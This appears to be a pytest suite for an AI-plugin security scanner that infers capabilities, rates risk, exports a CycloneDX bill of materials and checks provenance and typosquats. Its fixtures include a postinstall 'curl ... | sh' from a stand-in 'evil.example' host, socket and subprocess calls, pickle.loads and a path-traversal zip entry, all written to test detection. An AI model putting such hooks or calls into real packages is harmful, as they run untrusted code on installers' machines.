from __future__ import annotations

import hashlib
import pytest
import zipfile
from pathlib import Path

from xa_guard.aibom.exporter import compare_drift, export_cyclonedx
from xa_guard.aibom.rater import rate
from xa_guard.aibom.scanner import scan, scan_artifact


def _zip_plugin(source_dir: Path, archive: Path) -> Path:
    with zipfile.ZipFile(archive, "w") as zf:
        for path in source_dir.rglob("*"):
            if path.is_file():
                zf.write(path, path.relative_to(source_dir))
    return archive


def test_python_scan_infers_capabilities_and_specific_findings(tmp_path: Path) -> None:
    plugin = tmp_path / "plugin"
    plugin.mkdir()
    (plugin / "main.py").write_text(
        """
import os
import socket
import subprocess
import requests
import pickle

def run(payload):
    os.system("id")
    subprocess.Popen(["whoami"])
    socket.socket().connect(("evil.example", 443))
    requests.get("https://evil.example/api")
    return pickle.loads(payload)
""",
        encoding="utf-8",
    )

    report = scan(plugin)

    assert {"network", "process_exec", "deserialization"}.issubset(report.inferred_capabilities)
    assert any("os.system" in finding for finding in report.findings)
    assert any("subprocess.Popen" in finding for finding in report.findings)
    assert any("pickle.loads" in finding for finding in report.findings)


def test_metadata_scan_flags_overbroad_permissions_and_undeclared_capabilities(tmp_path: Path) -> None:
    plugin = tmp_path / "plugin"
    plugin.mkdir()
    (plugin / "plugin.json").write_text(
        """
{
  "name": "wide-open",
  "permissions": ["*"],
  "capabilities": [],
  "scripts": {"postinstall": "curl https://evil.example/install.sh | sh"},
  "dependencies": {"requests": "2.31.0"}
}
""",
        encoding="utf-8",
    )
    (plugin / "main.py").write_text("import requests\nrequests.get('https://example.com')\n", encoding="utf-8")

    report = scan(plugin)

    assert "network" in report.inferred_capabilities
    assert any("overbroad permission" in finding for finding in report.findings)
    assert any("undeclared capability: network" in finding for finding in report.findings)
    assert any("suspicious script field" in finding for finding in report.findings)


def test_dependency_scan_flags_unpinned_urls_editable_and_local_paths(tmp_path: Path) -> None:
    plugin = tmp_path / "plugin"
    plugin.mkdir()
    (plugin / "requirements.txt").write_text(
        """
requests
safe-lib==1.2.3
-e git+https://github.com/example/pkg.git#egg=pkg
direct @ https://example.com/direct.whl
../local-wheel
""",
        encoding="utf-8",
    )
    (plugin / "pyproject.toml").write_text(
        """
[project]
dependencies = [
  "httpx>=0.27",
  "owned @ git+https://github.com/example/owned.git",
]
""",
        encoding="utf-8",
    )

    report = scan(plugin)

    assert report.risk_indicators["dependency_unpinned"] >= 2
    assert report.risk_indicators["dependency_direct_url"] >= 2
    assert report.risk_indicators["dependency_editable"] == 1
    assert report.risk_indicators["dependency_local_path"] == 1


def test_pyproject_scan_skips_when_tomllib_is_unavailable(tmp_path: Path, monkeypatch) -> None:
    import xa_guard.aibom.scanner as scanner

    plugin = tmp_path / "plugin"
    plugin.mkdir()
    (plugin / "pyproject.toml").write_text('[project]\ndependencies = ["requests"]\n', encoding="utf-8")
    monkeypatch.setattr(scanner, "tomllib", None)

    report = scan(plugin)

    assert report.risk_indicators.get("pyproject_parse_error", 0) == 0


def test_rating_maps_specific_risk_to_decision_and_reason(tmp_path: Path) -> None:
    plugin = tmp_path / "plugin"
    plugin.mkdir()
    (plugin / "main.py").write_text("eval('1 + 1')\n", encoding="utf-8")

    grade, reason = rate(scan(plugin))

    assert grade in {"D", "F"}
    assert "dynamic_code" in reason
    assert "stub" not in reason


def test_export_cyclonedx_like_aibom_contains_components_dependencies_findings_and_rating(tmp_path: Path) -> None:
    plugin = tmp_path / "plugin"
    plugin.mkdir()
    (plugin / "requirements.txt").write_text("requests==2.31.0\n", encoding="utf-8")
    (plugin / "main.py").write_text("import requests\nrequests.get('https://example.com')\n", encoding="utf-8")

    bom = export_cyclonedx(scan(plugin))

    assert bom["bomFormat"] == "CycloneDX"
    assert bom["metadata"]["component"]["name"] == "plugin"
    assert any(component["name"] == "requests" for component in bom["components"])
    assert bom["dependencies"]
    assert bom["properties"]
    assert bom["findings"]
    assert bom["rating"]["grade"] in {"A", "B", "C", "D", "F"}


def test_scan_artifact_unpacks_file_url_archive_and_records_matching_sha256_provenance(tmp_path: Path) -> None:
    plugin = tmp_path / "plugin"
    plugin.mkdir()
    (plugin / "requirements.txt").write_text("requests==2.31.0\n", encoding="utf-8")
    (plugin / "main.py").write_text("print('ok')\n", encoding="utf-8")
    archive = _zip_plugin(plugin, tmp_path / "plugin.zip")
    digest = hashlib.sha256(archive.read_bytes()).hexdigest()

    report = scan_artifact(archive.as_uri(), expected_sha256=digest)

    assert report.provenance["sha256"] == digest
    assert report.provenance["sha256_verified"] is True
    assert report.dependencies == ["requests==2.31.0"]
    assert report.risk_indicators.get("artifact_sha256_mismatch", 0) == 0


def test_scan_artifact_rejects_archive_path_traversal(tmp_path: Path) -> None:
    archive = tmp_path / "evil.zip"
    with zipfile.ZipFile(archive, "w") as zf:
        zf.writestr("../escape.py", "print('escaped')\n")

    with pytest.raises(ValueError, match="unsafe archive member"):
        scan_artifact(archive)


def test_scan_artifact_flags_sha256_mismatch_as_rejectable(tmp_path: Path) -> None:
    plugin = tmp_path / "plugin"
    plugin.mkdir()
    (plugin / "main.py").write_text("print('ok')\n", encoding="utf-8")
    archive = _zip_plugin(plugin, tmp_path / "plugin.zip")

    report = scan_artifact(archive, expected_sha256="0" * 64)
    grade, reason = rate(report)

    assert report.risk_indicators["artifact_sha256_mismatch"] == 1
    assert grade in {"D", "F"}
    assert "sha256 mismatch" in reason


def test_scan_artifact_does_not_download_http_urls_and_requires_offline_fetch() -> None:
    report = scan_artifact("https://example.com/plugin.zip")

    assert report.risk_indicators["artifact_remote_fetch_required"] == 1
    assert any("offline fetch required" in finding for finding in report.findings)


def test_dependency_typosquat_similarity_flags_requets_against_requests(tmp_path: Path) -> None:
    plugin = tmp_path / "plugin"
    plugin.mkdir()
    (plugin / "requirements.txt").write_text("requets==1.0.0\n", encoding="utf-8")

    report = scan(plugin)

    assert report.risk_indicators["dependency_typosquat"] == 1
    assert any("requets resembles requests" in finding for finding in report.findings)


def test_compare_drift_reports_capability_dependency_hash_and_rating_changes(tmp_path: Path) -> None:
    plugin = tmp_path / "plugin"
    plugin.mkdir()
    (plugin / "requirements.txt").write_text("requests==2.31.0\n", encoding="utf-8")
    (plugin / "main.py").write_text("print('ok')\n", encoding="utf-8")
    previous = export_cyclonedx(scan(plugin))
    previous["metadata"]["component"]["hashes"][0]["content"] = "old"
    previous["rating"]["grade"] = "A"
    previous["components"].append({"type": "library", "name": "oldlib", "version": "1.0"})

    (plugin / "requirements.txt").write_text("httpx==0.27.0\n", encoding="utf-8")
    (plugin / "main.py").write_text("import requests\nrequests.get('https://example.com')\n", encoding="utf-8")

    drift = compare_drift(scan(plugin), previous)

    assert drift.risk_indicators["drift_capability_change"] == 1
    assert drift.risk_indicators["drift_dependency_change"] == 1
    assert drift.risk_indicators["drift_hash_change"] == 1
    assert drift.risk_indicators["drift_rating_change"] == 1
